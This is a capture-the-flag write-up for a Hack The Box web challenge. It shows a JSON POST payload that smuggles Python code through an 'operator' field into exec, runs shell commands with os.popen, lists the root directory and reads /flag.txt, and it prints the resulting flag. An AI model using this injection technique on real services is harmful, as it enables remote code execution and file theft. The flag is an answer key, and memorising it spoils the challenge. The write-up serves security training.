# Evaluation Deck

> **DIFFICULTY**: easy
> 
> **POINTS**: 200

### Question

> A powerful demon has sent one of his ghost generals into our world to 
> ruin the fun of Halloween. The ghost can only be defeated by luck. Are 
> you lucky enough to draw the right cards to defeat him and save this 
> Halloween?

### Solution

- After reading the code and understanding it you will see in `challenge/application/blueprints/routes.py` the real work is made when requesting `SERVER-IP/api/get_health` using **POST** method

- We see that there is `exec` method and that's our HAPPINESS BULB

- After reading a bit about `compile` method in python I understood that Content-Type of the POST request must be json `Content-Type: application/json`

- After testing a bit I was able to build this little POST payload 

- > {
  > 
  >     "current_health": "0",
  >     "attack_power": "0",
  >     "operator": "\nimport os\nresult = os.popen('ls /').read()\nres = "
  > 
  > }

- The result was

- > {"message":"app\nbin\ndev\netc\nflag.txt\nhome\nlib\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n"}

- Then I changed the command from `'ls /` to `cat /flag.txt` and VOILAA 👏

- Result was 

- > {"message":"HTB{c0d3_1nj3ct10ns_4r3_Gr3at!!}"}

### Flag

> HTB{c0d3_1nj3ct10ns_4r3_Gr3at!!}
